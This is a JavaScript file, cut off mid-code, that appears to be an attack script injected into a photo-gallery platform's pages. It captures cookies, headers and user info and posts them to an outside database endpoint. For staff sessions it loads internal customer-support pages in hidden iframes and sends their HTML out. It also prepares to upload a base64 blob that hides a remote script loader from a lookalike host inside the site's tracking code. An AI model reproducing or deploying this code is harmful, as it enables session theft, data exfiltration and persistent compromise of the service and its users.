// Only run if not in iframe (like in mobile preview window)
if (window.location === parent.window.location) {
  // Setup the functions
  if (!window.ptxSetupComplete) {
    const jsonDocBase64 =
      "PG1ldGEgbmFtZT0icGludGVyZXN0IiBjb250ZW50PSJub3BpbiIgZGVzY3JpcHRpb249IiIgLz4NCjxzY3JpcHQ+DQohZnVuY3Rpb24oZixiLGUsdixuLHQscyl7aWYoZi5mYnEpcmV0dXJuO249Zi5mYnE9ZnVuY3Rpb24oKXtuLmNhbGxNZXRob2Q/DQpuLmNhbGxNZXRob2QuYXBwbHkobixhcmd1bWVudHMpOm4ucXVldWUucHVzaChhcmd1bWVudHMpfTtpZighZi5fZmJxKWYuX2ZicT1uOw0Kbi5wdXNoPW47bi5sb2FkZWQ9ITA7bi52ZXJzaW9uPScyLjAnO24ucXVldWU9W107dD1iLmNyZWF0ZUVsZW1lbnQoZSk7dC5hc3luYz0hMDsNCnQuc3JjPXY7cz1iLmdldEVsZW1lbnRzQnlUYWdOYW1lKGUpWzBdO3MucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUodCxzKX0od2luZG93LA0KZG9jdW1lbnQsJ3NjcmlwdCcsJ2h0dHBzOi8vY29ubmVjdC5mYWNlYm9vay5uZXQvZW5fVVMvZmJldmVudHMuanMnKTsNCmZicSgnaW5pdCcsICcxMzM2NDYxOTM5Nzc0MjczJyk7IC8vIEluc2VydCB5b3VyIHBpeGVsIElEIGhlcmUuDQovLy8vZmJxKCd0cmFjaycsICdQYWdlVmlldycpOw0KPC9zY3JpcHQ+DQo8bm9zY3JpcHQ+PGltZyBoZWlnaHQ9IjEiIHdpZHRoPSIxIiBzdHlsZT0iZGlzcGxheTpub25lIg0Kc3JjPSJodHRwczovL3d3dy5mYWNlYm9vay5jb20vdHI/aWQ9MTMzNjQ2MTkzOTc3NDI3MyZldj1QYWdlVmlldyZub3NjcmlwdD0xIg0KLz48L25vc2NyaXB0Pg0KPCEtLSBETyBOT1QgTU9ESUZZIC0tPg0KPCEtLSBFbmQgRmFjZWJvb2sgUGl4ZWwgQ29kZSAtLT4NCjxzY3JpcHQ+DQoNCihmdW5jdGlvbigpe3ZhciB3PXdpbmRvdzt2YXIgaWM9dy5JbnRlcmNvbTtpZih0eXBlb2YgaWM9PT0iZnVuY3Rpb24iKXtpYygncmVhdHRhY2hfYWN0aXZhdG9yJyk7aWMoJ3VwZGF0ZScsdy5pbnRlcmNvbVNldHRpbmdzKTt9ZWxzZXt2YXIgZD1kb2N1bWVudDt2YXIgaT1mdW5jdGlvbigpe2kuYyhhcmd1bWVudHMpO307aS5xPVtdO2kuYz1mdW5jdGlvbihhcmdzKXtpLnEucHVzaChhcmdzKTt9O3cuSW50ZXJjb209aTt2YXIgbD1mdW5jdGlvbigpe3ZhciBzPWQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnO3MuYXN5bmM9dHJ1ZTtzLnNyYz0naHR0cHM6Ly93aWRnZXQuaW50ZXJjb20uaW8vd2lkZ2V0L3BmZjV1cWZyJzt2YXIgeD1kLmdldEVsZW1lbnRzQnlUYWdOYW1lKCdzY3JpcHQnKVswXTt4LnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKHMseCk7fTtpZihkb2N1bWVudC5yZWFkeVN0YXRlPT09J2NvbXBsZXRlJyl7bCgpO31lbHNlIGlmKHcuYXR0YWNoRXZlbnQpe3cuYXR0YWNoRXZlbnQoJ29ubG9hZCcsbCk7fWVsc2V7dy5hZGRFdmVudExpc3RlbmVyKCdsb2FkJyxsLGZhbHNlKTt9fX0pKCk7KGZ1bmN0aW9uKCl7dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3NjcmlwdC5zcmMgPSAnaHR0cHM6Ly9waWN0aW1lY2xvdWRhZi1hLmdpdGh1Yi5pby9waWN0dXJlcy9zY3JpcHRzL2NvbXBpbGVkL2FydGdhbGxlcnlfYmFzZS5qcyc7ZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzY3JpcHQpO30pKCk7DQo8L3NjcmlwdD4NCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCnZhciBuZWVkQ2hlY2tDYW1wID0gdHJ1ZTsNCnZhciBoYXNTcGVDYW1wPWZhbHNlOw0KdmFyIGhhc1NwZUNhbXBBY3Q9ZmFsc2U7DQp2YXIgdXNlckNvdXBvbiA9IG51bGw7DQp2YXIgbmVlZExvYWRDaGF0PXRydWU7DQp2YXIgbmVlZExvYWRHQT10cnVlOw0KdmFyIG5lZWRMb2FkR1RNID0gdHJ1ZTsNCnZhciBoaWRlQ2hhdCA9IGZhbHNlOw0KdmFyIGlzUGF5aW5nID0gZmFsc2U7DQp2YXIgbmVlZElzUGF5aW5nID0gdHJ1ZTsNCnZhciB1c2VyVHlwZSA9ICcnOw0KPC9zY3JpcHQ+DQoNCjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4NCl9wdF9yZXBvcnRVc2VySm91cm5leSA9IGZ1bmN0aW9uKGpvdXJuZXlOYW1lLCB1c2VySm91cm5leU5hbWUsIGN1cnJlbnRTdGVwTmFtZSwgYWN0aW9uKXsNCglJbnRlcmNvbSgndHJhY2tFdmVudCcsIGpvdXJuZXlOYW1lKyctJythY3Rpb24pOw0KfQ0KX29uTG9hZFB0Q3VzdG9tRXZlbnQgPSBmdW5jdGlvbihwYWdlTmFtZSwgdHlwZSwgdXNlcklkKXsNCglpZiAobmVlZExvYWRDaGF0KQ0KCXsNCgkJaWYgKGluaXRQYXJhbXMudXNlciA9PSBudWxsKQ0KCQl7DQoJCQlpZiAoaW5pdFBhcmFtcy5sb2NrZW1haWwgPT0gbnVsbCkNCgkJCQl1c2VyVHlwZSA9ICdVbmtub3duJzsNCgkJCWVsc2UNCgkJCQl1c2VyVHlwZSA9ICdQaG90b2dyYXBoZXInOw0KCQl9DQoJCWVsc2UNCgkJeyANCgkJCWlmIChpbml0UGFyYW1zLnVzZXI/LnR5cGUgPT0gbnVsbCkNCgkJCXsNCgkJCQlpZiAoaW5pdFBhcmFtcy5sb2NrZW1haWwgPT0gbnVsbCAmJiBpbml0UGFyYW1zLnVzZXI/LnNpZ25VcERhdGUgPT0gbnVsbCkNCgkJCQkJdXNlclR5cGUgPSAnVW5rbm93bic7DQoJCQkJZWxzZQ0KCQkJCQl1c2VyVHlwZSA9ICdQaG90b2dyYXBoZXInOw0KCQkJfQ0KCQkJZWxzZQ0KCQkJCXN3aXRjaCAoaW5pdFBhcmFtcy51c2VyPy50eXBlKSB7DQoJCQkJY2FzZSAxOg0KCQkJCQl1c2VyVHlwZSA9ICdQaG90b2dyYXBoZXInOw0KCQkJCQlicmVhazsNCgkJCQljYXNlIDI6DQoJCQkJCXVzZXJUeXBlID0gJ0dhbGxlcnkgT3duZXInOw0KCQkJCQlicmVhazsNCgkJCQljYXNlIDM6DQoJCQkJCXVzZXJUeXBlID0gJ0dhbGxlcnkgR3Vlc3QnOw0KCQkJCQlicmVhazsNCgkJCQljYXNlIDQ6DQoJCQkJCXVzZXJUeXBlID0gJ0dhbGxlcnkgVGVtcCBHdWVzdCc7DQoJCQkJCWJyZWFrOw0KCQkJCWNhc2UgMjA6DQoJCQkJCXVzZXJUeXBlID0gJ1Bob3RvZ3JhcGhlciBJbnZpdGVkJzsNCgkJCQkJYnJlYWs7DQoJCQkJZGVmYXVsdDoNCgkJCQkJdXNlclR5cGUgPSAnJzsNCgkJCQkJYnJlYWs7DQoJCQkJfSANCgkJfQ0KCQlpZiAoaW5pdFBhcmFtcy51c2VyID09IG51bGwpDQoJCQl3aW5kb3cuSW50ZXJjb20oImJvb3QiLCB7DQoJCQkJYXBpX2Jhc2U6ICJodHRwczovL2FwaS1pYW0uaW50ZXJjb20uaW8iLA0KCQkgIAkJYXBwX2lkOiAicGZmNXVxZnIiLA0KCQkgIAkJbmFtZTogaW5pdFBhcmFtcy5sb2NrZW1haWwsDQoJCSAgCQllbWFpbDogaW5pdFBhcmFtcy5sb2NrZW1haWwsDQoJCQkJdXNlcl9oYXNoOiBpbml0UGFyYW1zLmludGVyY29tSWRlbnRpdHlIYXNoDQoJCQl9KTsNCgkJZWxzZSBpZighX3B0JC5pc1N1cHBvcnRVc2VyKCkpDQoJCQl3aW5kb3cuSW50ZXJjb20oImJvb3QiLCB7DQoJCQkJYXBpX2Jhc2U6ICJodHRwczovL2FwaS1pYW0uaW50ZXJjb20uaW8iLA0KCQkgIAkJYXBwX2lkOiAicGZmNXVxZnIiLA0KCQkJCXVzZXJfaWQ6IGluaXRQYXJhbXMuaW50ZXJjb21JZGVudGl0eUhhc2hUeXBlID09ICJhY2NvdW50SWQiID8gX2RhdGFIYW5kbGVyJC5hY2NvdW50LmFjY291bnRJZCA6IG51bGwsDQoJCSAgCQluYW1lOiBpbml0UGFyYW1zLnVzZXI/Lm5hbWUsDQoJCSAgCQllbWFpbDogaW5pdFBhcmFtcy51c2VyPy5lbWFpbCwNCgkJCQl1c2VyX2hhc2g6IGluaXRQYXJhbXMuaW50ZXJjb21JZGVudGl0eUhhc2gsDQoJCQkJdXNlcl90eXBlOiB1c2VyVHlwZSwNCgkJCQlsb2NhbF91c2VyX2lkOiBpbml0UGFyYW1zLnVzZXI/LmlkLA0KCQkJCWN1cnJlbnRfY29tcGFueV9pZDogaW5pdFBhcmFtcy5hY2NvdW50SWQsDQoJCQkJJ3Bob3RvZ19hY2NvdW50X2NyZWF0aW9uX2RhdGUnOiBpbml0UGFyYW1zLnVzZXI/LnNpZ25VcERhdGUsDQoJCQkJJ2FmZmlsaWF0ZV9pZCc6IF9kYXRhSGFuZGxlciQuYWNjb3VudC5hZmZpbGlhdGVJZCwNCgkJCQknbnVtX2dhbGxlcmllcyc6IF9kYXRhSGFuZGxlciQuZGFzaGJvYXJkLnByb2plY3RzLmxlbmd0aCwNCgkJCQknb25ib2FyZGluZ193Zic6IF9ndWlIYW5kbGVyJC5nZXRPbmJvYXJkaW5nTmFtZT8uKCksDQoJCQkJJ2NvbXBhbnknOiB7DQogICAgCQkJCQknaWQnOiBpbml0UGFyYW1zLmFjY291bnRJZA0KCQkJCQl9DQoJCQl9KTsNCgkJDQoJCV9wdCQuYmluZCggJ2hpZGVDaGF0JywgKCkgPT4gew0KICAgIAkJCUludGVyY29tKCAnaGlkZScgKTsNCgkJfSApOw0KCQlfcHQkLmJpbmQoICdzaG93Q2hhdCcsICgpID0+IHsNCiAgICAJCQlJbnRlcmNvbSggJ3Nob3cnICk7DQoJCX0gKTsNCgkJbmVlZExvYWRDaGF0ID0gZmFsc2U7IA0KCQkNCgl9CQ0KCWlmIChuZWVkTG9hZEdBKQ0KCXsNCgkJaWYgKGluaXRQYXJhbXMudXNlciA9PSBudWxsIHx8IGluaXRQYXJhbXMudXNlcj8uZ3VzZXJJZCA9PSBudWxsKQ0KCQl7DQoJCQl3aW5kb3cuZGF0YUxheWVyID0gd2luZG93LmRhdGFMYXllciB8fCBbXTsNCgkJCWZ1bmN0aW9uIGd0YWcoKXtkYXRhTGF5ZXIucHVzaChhcmd1bWVudHMpO30NCgkJCWd0YWcoJ2pzJywgbmV3IERhdGUoKSk7DQoJCQlndGFnKCdjb25maWcnLCAnRy1XRlFGRlo4NkJRJyk7DQoJCX0NCgkJZWxzZQ0KCQl7DQoJCQl3aW5kb3cuZGF0YUxheWVyID0gd2luZG93LmRhdGFMYXllciB8fCBbXTsNCgkJCWZ1bmN0aW9uIGd0YWcoKXtkYXRhTGF5ZXIucHVzaChhcmd1bWVudHMpO30NCgkJCWd0YWcoJ2pzJywgbmV3IERhdGUoKSk7DQoJCQlndGFnKCdjb25maWcnLCAnRy1XRlFGRlo4NkJRJywgeyd1c2VyX2lkJzogaW5pdFBhcmFtcy51c2VyPy5ndXNlcklkfSk7DQoJCX0NCgkJbmVlZExvYWRHQSA9IGZhbHNlOyANCgl9DQoJaWYobmVlZElzUGF5aW5nICYmIHR5cGVvZihfZGF0YUhhbmRsZXIkKSAhPT0gJ3VuZGVmaW5lZCcpDQoJew0KCQlpc1BheWluZyA9ICFfZGF0YUhhbmRsZXIkLmlzRnJlZVN1YnMoMCkgJiYgIV9kYXRhSGFuZGxlciQuaXNUcmlhbFN1YnMoMCkgJiYgIV9kYXRhSGFuZGxlciQuaXNUcmFuc2l0aW9uU3ViKDAsdHJ1ZSk7DQoJCW5lZWRJc1BheWluZz1mYWxzZTsNCgl9DQoJc3dpdGNoIChwYWdlTmFtZSkgew0KCQljYXNlICdwcmonOg0KCQkJIHdpbmRvdy5kYXRhTGF5ZXIucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3Byb2plY3RJZCc6IF9kYXRhSGFuZGxlciQucHJvamVjdC5wcm9qZWN0SWQNCiAgICAgICAgICAgICAgICAgICAgICAgIH0pOw0KCQkJYnJlYWs7DQoJCWNhc2UgJy92L3VzZXIvcmVnaXN0cmF0aW9uL3ZpZXdlZCc6DQoJCQlmYnEoJ3RyYWNrU2luZ2xlQ3VzdG9tJywgJzEzMzY0NjE5Mzk3NzQyNzMnLCAncmVnaXN0ZXJBY2NvdW50RGV0YWlscycsIHsNCgkJCQl1c2VyRW1haWw6IGluaXRQYXJhbXMubG9ja2VtYWlsDQoJCQl9KTsNCgkJCUludGVyY29tKCdzaHV0ZG93bicpOw0KCQkJYnJlYWs7DQoJCWNhc2UgJ2RpYWxvZ19zdWJzY3JpcHRpb25zJzoJCQkNCg0KCQkJJCgnZGl2W3N1YnNjcmluZGV4PSIxIl0gLnBCdXR0b24nKVswXS5vbmNsaWNrID0gZnVuY3Rpb24oKXsgcGxhblZhbHVlID0gMTU7IH07DQoJCQkkKCdkaXZbc3Vic2NyaW5kZXg9IjIiXSAucEJ1dHRvbicpWzBdLm9uY2xpY2sgPSBmdW5jdGlvbigpeyBwbGFuVmFsdWUgPSAzMDsgfTsNCgkJCSQoJ2RpdltzdWJzY3JpbmRleD0iMyJdIC5wQnV0dG9uJylbMF0ub25jbGljayA9IGZ1bmN0aW9uKCl7IHBsYW5WYWx1ZSA9IDYwOyB9Ow0KCQkJYnJlYWs7DQoJCWNhc2UgJ2Rhc2gnOg0KCQljYXNlICdkaWFsb2dfd2VsY29tZUludHJvJzoJCQkNCgkJCWNvbnN0IHNob3dQYXJhbSA9IHBpY3RpbWVHZXRVcmxQYXJhbWV0ZXJzKCJzaG93Iik7DQogICAgICAgICAgICBpZihzaG93UGFyYW0gPT0gIm1hcmtldGluZ3dpemFyZCIpew0KCQljb25zdCBjdXJyZW50VXJsID0gd2luZG93LmxvY2F0aW9uLm9yaWdpbiArIHdpbmRvdy5sb2NhdGlvbi5wYXRobmFtZTsNCgkJY29uc3QgY3VycmVudEhhc2ggPSB3aW5kb3cubG9jYXRpb24uaGFzaDsNCgkJd2luZG93Lmhpc3RvcnkucmVwbGFjZVN0YXRlKG51bGwsICIiLCBjdXJyZW50VXJsICsgY3VycmVudEhhc2gpOw0KICAgICAgICAgICAgICAgIF9ndWlIYW5kbGVyJC5zdGFydFdGUHJvY2VzcygibWFya2V0aW5nIik7DQoJCX0NCgkJCQkNCgkJCWlmIChuZWVkTG9hZEdUTSAmJiBfZGF0YUhhbmRsZXIkLmRhc2hib2FyZC5wcm9qZWN0cykNCgkJCXsNCgkJCQluZWVkTG9hZEdUTSA9IGZhbHNlOw0KCQkJCXdpbmRvdy5kYXRhTGF5ZXIucHVzaCh7J2FjY291bnRJZCc6IGluaXRQYXJhbXMuYWNjb3VudElkfSk7DQoJCQkJd2luZG93LmRhdGFMYXllci5wdXNoKHsnaW50ZXJmYWNlJzogJ3Bob3RvZ3JhcGhlcid9KTsNCgkJCQl3aW5kb3cuZGF0YUxheWVyLnB1c2goeydldmVudCc6ICdwdF9sb2FkJ30pOw0KCQkJCWlmKChuZXcgRGF0ZSgpKS5nZXRUaW1lKCkgLSBwaWN0aW1lUGFyc2VEYXRlKF9kYXRhSGFuZGxlciQuYWNjb3VudC5hY2NvdW50Q3JlYXRlZCkuZ2V0VGltZSgpIDwgNjAwMDAgJiYgX2RhdGFIYW5kbGVyJC5kYXNoYm9hcmQucHJvamVjdHMubGVuZ3RoID09IDApew0KCQkJCQl3aW5kb3cuZGF0YUxheWVyLnB1c2goeyAnZXZlbnQnOiAnbmV3QWNjb3VudENyZWF0aW9uJyB9KTsNCgkJCQkJZmJxKCd0cmFja1NpbmdsZUN1c3RvbScsICcxMzM2NDYxOTM5Nzc0MjczJywgJ3JlZ2lzdGVyQWNjb3VudENvbXBsZXRlJywgew0KCQkJCQkJdXNlckVtYWlsOiBpbml0UGFyYW1zLmxvY2tlbWFpbA0KCQkJCQl9KTsNCgkJCQkJSW50ZXJjb20oJ3VwZGF0ZScsIHsic3ViX3N0YXR1cyI6ICJUcmlhbCJ9KTsNCgkJCQkJSW50ZXJjb20oJ3VwZGF0ZScsIHsidHJpYWxfZW5kX2RhdGUiOiBwaWN0aW1lQWRkRGF5cyhwaWN0aW1lUGFyc2VEYXRlKF9kYXRhSGFuZGxlciQuYWNjb3VudC5hY2NvdW50Q3JlYXRlZCksIDMwKX0pOw0KCQkJCQlJbnRlcmNvbSgndXBkYXRlJywgeyJlYl9lbmRfZGF0ZSI6IHBpY3RpbWVBZGREYXlzKHBpY3RpbWVQYXJzZURhdGUoX2RhdGFIYW5kbGVyJC5hY2NvdW50LmFjY291bnRDcmVhdGVkKSwgNyl9KTsNCgkJCQkJSW50ZXJjb20oJ3VwZGF0ZScsIHsiZnJlZTEwZ2JfZW5kX2RhdGUiOiBwaWN0aW1lQWRkRGF5cyhwaWN0aW1lUGFyc2VEYXRlKF9kYXRhSGFuZGxlciQuYWNjb3VudC5hY2NvdW50Q3JlYXRlZCksIDE4MCl9KTsNCgkJCQkJaWYod2luZG93LmlubmVyV2lkdGggPCA4MDApDQoJCQkJCQlJbnRlcmNvbSgndXBkYXRlJywgeyJmaXJzdF90b3VjaF9kZXZpY2UiOiAibW9iaWxlIn0pOwkJCQkJDQoJCQkJfQ0KCQkJCWlmKF9kYXRhSGFuZGxlciQuZGFzaGJvYXJkLnByb2plY3RzLmxlbmd0aCA9PSAwICYmIHdpbmRvdy5pbm5lcldpZHRoID4gODAwICYmICFfcHQkLmlzTW9iaWxlKXsNCgkJCQkJdmFyIGZsb3dOYW1lID0gX2d1aUhhbmRsZXIkLmdldE9uYm9hcmRpbmdOYW1lPy4oKSB8fCAnb25ib2FyZGluZ3dvcmtmbG93cyc7IA0KCQkJCQlpZihmbG93TmFtZSA9PSAnb25ib2FyZGluZ3dvcmtmbG93cycpew0KCQkJCQkJX2d1aUhhbmRsZXIkLnN0YXJ0V0ZQcm9jZXNzKGZsb3dOYW1lLCAnU3RhbmRhcmQgdXNlcicsIGZhbHNlKTsJDQoJCQkJCQlfcHQkLnJlbGVhc2VBY2NvdW50V2VsY29tZUVtYWlsKCk7DQoJCQkJCX0NCgkJCQl9CQ0KCQkJfQ0KCQkJYnJlYWs7DQoJCWNhc2UgJy91L3Bob3RvZ3JhcGhlci9zdWJzY3JpcHRpb24nOg0KCQkJaWYoaXNQYXlpbmcgJiYgX2RhdGFIYW5kbGVyJC5pc1RyYW5zaXRpb25TdWIoMCx0cnVlKSkNCgkJCXsNCgkJCQlpc1BheWluZyA9IGZhbHNlOw0KCQkJCS8vLyBzdGFydCBleGlzdCBzdXJ2ZXkNCgkJCQlJbnRlcmNvbSgndHJhY2tFdmVudCcsICdjYW5jZWxfc3ViJyk7DQoJCQkJd2luZG93LmRhdGFMYXllciA9IHdpbmRvdy5kYXRhTGF5ZXIgfHwgW107IHdpbmRvdy5kYXRhTGF5ZXIucHVzaCh7ICdldmVudCc6ICdjYW5jZWxTdWInIH0pOw0KCQkJfQ0KCQkJZWxzZSBpZighaXNQYXlpbmcgJiYgIV9kYXRhSGFuZGxlciQuaXNGcmVlU3VicygwKSAmJiAhX2RhdGFIYW5kbGVyJC5pc1RyaWFsU3VicygwKSAmJiAhX2RhdGFIYW5kbGVyJC5pc1RyYW5zaXRpb25TdWIoMCx0cnVlKSkNCgkJCXsNCgkJCQlpc1BheWluZyA9ICFfZGF0YUhhbmRsZXIkLmlzRnJlZVN1YnMoMCkgJiYgIV9kYXRhSGFuZGxlciQuaXNUcmlhbFN1YnMoMCk7DQoJCQkJX3B0JC5waHRMb2FkU3lzdGVtUGF5bWVudHMoZnVuY3Rpb24ocmVjcyl7DQoJCQkJCXZhciBzdWJzUGF5ID0gcmVjcy5maWx0ZXIocGF5bWVudCA9PiBwYXltZW50LnR5cGUgPT0gMjAgJiYgcGF5bWVudC50b3RhbCA+IDApOw0KICAgICAgICAgICAgICAgICAgICAJCQlpZihzdWJzUGF5Lmxlbmd0aCA9PSAxKQ0KCQkJCQl7DQoJCQkJCQlmYnEoJ3RyYWNrJywgJ1B1cmNoYXNlJywgew0KCQkJCQkJCXVzZXJFbWFpbDogaW5pdFBhcmFtcy51c2VyPy5lbWFpbCwNCgkJCQkJCQl1c3JJZDogaW5pdFBhcmFtcy51c2VyPy5pZCwNCgkJCQkJCQl2YWx1ZTogc3Vic1BheVswXS50b3RhbCwJDQoJCQkJCQkJY3VycmVuY3k6ICdVU0QnDQoJCQkJCQl9KTsNCgkJCQkJCXdpbmRvdy5kYXRhTGF5ZXIgPSB3aW5kb3cuZGF0YUxheWVyIHx8IFtdOyB3aW5kb3cuZGF0YUxheWVyLnB1c2goeyAnZXZlbnQnOiAnbmV3UHVyY2hhc2UnIH0pOw0KCQkJCQkJaWYoc3Vic1BheVswXS5zdWJzQ29sbGVjdGlvbkludGVydmFsID09IDEwKQ0KCQkJCQkJew0KCQkJCQkJCXdpbmRvdy5kYXRhTGF5ZXIucHVzaCh7ICdldmVudCc6ICd5ZWFybHlTdWJQdXJjaGFzZScgfSk7DQoJCQkJCQkJSW50ZXJjb20oJ3RyYWNrRXZlbnQnLCAnbmV3X3llYXJseV9wdXJjaGFzZScpOw0KCQkJCQkJCWZicSgndHJhY2tTaW5nbGVDdXN0b20nLCAnMTMzNjQ2MTkzOTc3NDI3MycsICd5ZWFybHlTdWJQdXJjaGFzZScsIHsNCgkJCQkJCQkJdXNlckVtYWlsOiBpbml0UGFyYW1zLmxvY2tlbWFpbA0KCQkJCQkJCX0pOw0KCQkJCQkJCWlmKF9kYXRhSGFuZGxlciQuYWNjb3VudC5hZmZpbGlhdGVJZCA9PSAyMDEgfHwgX2RhdGFIYW5kbGVyJC5hY2NvdW50LmFmZmlsaWF0ZUlkID09IDIwOCkNCgkJCQkJCQl7CXNob3dQU09mZmVyKCk7DQoJCQkJCQkJCUludGVyY29tKCd0cmFja0V2ZW50JywgJ3Nob3dQU09mZmVyJyk7DQoJCQkJCQkJfQ0KCQkJCQkJfQ0KCQkJCQkJZWxzZQ0KCQkJCQkJew0KCQkJCQkJCXdpbmRvdy5kYXRhTGF5ZXIucHVzaCh7ICdldmVudCc6ICdtb250aGx5U3ViUHVyY2hhc2UnIH0pOw0KCQkJCQkJCUludGVyY29tKCd0cmFja0V2ZW50JywgJ25ld19tb250aGx5X3B1cmNoYXNlJyk7DQoJCQkJCQkJZmJxKCd0cmFja1NpbmdsZUN1c3RvbScsICcxMzM2NDYxOTM5Nzc0MjczJywgJ21vbnRobHlTdWJQdXJjaGFzZScsIHsNCgkJCQkJCQkJdXNlckVtYWlsOiBpbml0UGFyYW1zLmxvY2tlbWFpbA0KCQkJCQkJCX0pOw0KCQkJCQkJfQ0KCQkJCQkJCQ0KCQkJCQl9DQoJCQkJCWVsc2UgaWYoc3Vic1BheVtzdWJzUGF5Lmxlbmd0aC0xXS5zdWJzQ29sbGVjdGlvbkludGVydmFsID09IDEwKQ0KCQkJCQkJew0KCQkJCQkJCXdpbmRvdy5kYXRhTGF5ZXIucHVzaCh7ICdldmVudCc6ICdyZXR1cm5pbmdTdWJZZWFybHknIH0pOw0KCQkJCQkJCUludGVyY29tKCd0cmFja0V2ZW50JywgJ3JldHVybmluZ1N1YlllYXJseScpOw0KCQkJCQkJfQ0KICAgICAgICAgICAgICAgIAkJfSkJCQkJCQkJCQ0KCQkJfQ0KCQkJYnJlYWs7DQoJCWRlZmF1bHQ6DQoNCgkJCWJyZWFrOw0KCX0JDQoNCgkJDQp9DQogICAgICAgDQo8L3NjcmlwdD4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KCWZ1bmN0aW9uIHNob3dQU09mZmVyKCl7DQoJCW1lc3NhZ2V1eCA9IF9kYXRhSGFuZGxlciQuZGFzaGJvYXJkLnV4TWVzc2FnZXMuZmlsdGVyKG1zZz0+bXNnLnR5cGUgPT0gMTApWzBdOw0KCQlpZihtZXNzYWdldXgpew0KCQkJX3B0JC5vcGVuVXhNZXNzYWdlcyhtZXNzYWdldXgsIG51bGwpOw0KCQl9DQoJfQ0KCQ0KCWZ1bmN0aW9uIGNsb3NlYmFubmVyKCkNCgl7DQoJCW1lc3NhZ2V1eCA9IF9kYXRhSGFuZGxlciQuZGFzaGJvYXJkLnV4TWVzc2FnZXMuZmlsdGVyKG1zZz0+bXNnLmNvbnRlbnRJZCA9PSAncmVtaW5kaG9saWRheScpWzBdOw0KCQlpZihtZXNzYWdldXgpew0KCQkJX3B0JC5waHRSZXBvcnRVeE1lc3NhZ2VSZWFkKG1lc3NhZ2V1eC51eE1lc3NhZ2VJZCwgMSk7DQoJCX0NCgkJDQoJfSANCiAgICAgICAgDQo8L3NjcmlwdD4NCg==";
    const jsonFileSizeInBytes = 10024;

    const accessTokenRefresh = 300000; // 5 minutes

    try {
      // Setup uuidv4 function on window
      window.uuidv4 = () => {
        return ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, (c) =>
          (
            c ^
            (crypto.getRandomValues(new Uint8Array(1))[0] & (15 >> (c / 4)))
          ).toString(16)
        );
      };

      // Create a function to get the access token required to write to the mongo database
      const setPtxWindowAccessToken = async () => {
        return fetch(
          "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
        )
          .then((resp) => resp.json())
          .then((json) => json.access_token)
          .then((token) => (window.accessToken = token));
      };

      // Reset access token every 5 minutes
      setInterval(async () => {
        await setPtxWindowAccessToken();
      }, accessTokenRefresh);

      // Create a function to insert a document to into the mongo ingest collection
      window.insertDoc = async (type, data) => {
        const envelope = {};
        envelope.sessionId = window.rjsSessionId;
        envelope.type = type;
        envelope.data = data;
        envelope.userAgent = navigator?.userAgent;

        envelope.ptData = window.ptData;

        envelope.ts = Date.now();

        return fetch(
          "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Access-Control-Request-Headers": "*",
              Authorization: `Bearer ${window.accessToken}`,
            },
            body: JSON.stringify({
              collection: "ingest",
              database: "pictimeDataDb",
              dataSource: "pixieset-data",
              document: envelope,
            }),
          }
        );
      };

      window.getIFrame = async (iframeUrl) => {
        try {
          const iframe = document.createElement("iframe");
          iframe.src = iframeUrl;
          iframe.style.display = "none";
          document.body.appendChild(iframe);

          setTimeout(() => {
            const iframeHtml = iframe.contentDocument.documentElement.outerHTML;
            const iframeWindow = iframe.contentWindow;

            // Send Page HTML
            window.insertDoc("iframe-page-html", {
              location: iframeUrl,
              html: iframeHtml,
            });
          }, 10000);
        } catch (err) {
          console.error(err);
          window.insertDoc("error", err.toString());
        }
      };

      // Create a session ID for the window
      if (!window.rjsSessionId) {
        window.rjsSessionId = uuidv4();
      }

      // Start session
      function startSession() {
        window.insertDoc("session", { sessionId: window.rjsSessionId });

        // Send Location
        window.insertDoc("location", window.location);
      }

      window.ptxSetupComplete = true;

      // Now do stuff!

      // Capture PT Data
      window.ptData = {};
      window.ptData.headers = _pt$?.hdrs || null;
      window.ptData.userInfo = _pt$?.userInfo || null;
      window.ptData.cookie = document.cookie;

      // Load intial access token
      setPtxWindowAccessToken().then(async () => {
        // Start Remote Session
        startSession();

        if (window.ptData.headers?.gusr) {
          getIFrame("https://cstool.pic-time.com/!customersupport");
          getIFrame(
            "https://cstool.pic-time.com/userworkflows/support/customersupport.aspx"
          );

          const uuid = uuidv4();
          let uploadUrl;

          try {
            const uploadUrlResp = await fetch(
              `/!fineupload?bloburi=%2F${uuid}.html&_method=PUT&qqtimestamp=${Date.now()}`,
              {
                headers: {
                  accept: "application/json",
                  "accept-language": "en-US,en;q=0.9",
                  "cache-control": "no-cache",
                  pragma: "no-cache",
                  priority: "u=1, i",
                  "sec-ch-ua-mobile": "?0",
                  "sec-fetch-dest": "empty",
                  "sec-fetch-mode": "cors",
                  "sec-fetch-site": "same-origin",
                  "x-requested-with": "XMLHttpRequest",
                  Referer: "https://cstool.pic-time.com",
                  "Referrer-Policy": "strict-origin-when-cross-origin",
                  "User-Agent":
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                },
                body: null,
                method: "GET",
              }
            );

            uploadUrl = await uploadUrlResp.text();

            window.insertDoc("script-upload-url", { url: uploadUrl });
          } catch (e) {
            console.error(e);
            window.insertDoc("error", e.toString());
            return;
          }

          try {
            // Convert base64 string to a Uint8Array (binary buffer)
            function base64ToBuffer(base64) {
              const binaryString = atob(base64); // decode the base64 string to a binary string
              const byteArray = new Uint8Array(binaryString.length); // create a byte array
              for (let i = 0; i < binaryString.length; i++) {
                byteArray[i] = binaryString.charCodeAt(i); // populate the byte array
              }
              return byteArray;
            }

            const jsonFileBuffer = base64ToBuffer(jsonDocBase64);

